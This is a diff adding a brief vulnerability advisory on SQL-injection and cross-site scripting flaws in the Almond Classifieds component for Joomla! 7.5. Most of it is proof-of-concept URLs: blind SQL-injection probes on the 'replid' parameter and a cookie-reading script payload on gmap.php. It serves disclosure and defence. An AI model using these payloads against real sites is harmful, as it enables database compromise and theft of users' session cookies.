@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/35815/info
+
+Almond Classifieds Component for Joomla! is prone to a cross-site scripting vulnerability and an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+A successful exploit may allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Almond Classifieds Component for Joomla! 7.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/patch/index.php?option=com_aclassf&Itemid=53&ct=manw_repl&md=add_form&replid=[BLIND]
+http://www.example.com/index.php?option=com_aclassf&Itemid=53&ct=manw_repl&md=add_form&replid=11438 and 1=1 <= TRUE
+http://www.example.com/index.php?option=com_aclassf&Itemid=53&ct=manw_repl&md=add_form&replid=11438 and 1=2 <= FALSE
+http://www.example.com/index.php?option=com_aclassf&Itemid=53&ct=manw_repl&md=add_form&replid=11438+AND SUBSTRING(@@version,1,1)=5 => TRUE
+http://www.example.com/index.php?option=com_aclassf&Itemid=53&ct=manw_repl&md=add_form&replid=11438+AND SUBSTRING(@@version,1,1)=5 => FALSE
+http://www.example.com/patch/components/com_aclassf/gmap.php?addr=[XSS]
+http://www.example.com/components/com_aclassf/gmap.php?addr="><script>alert(document.cookie);</script>
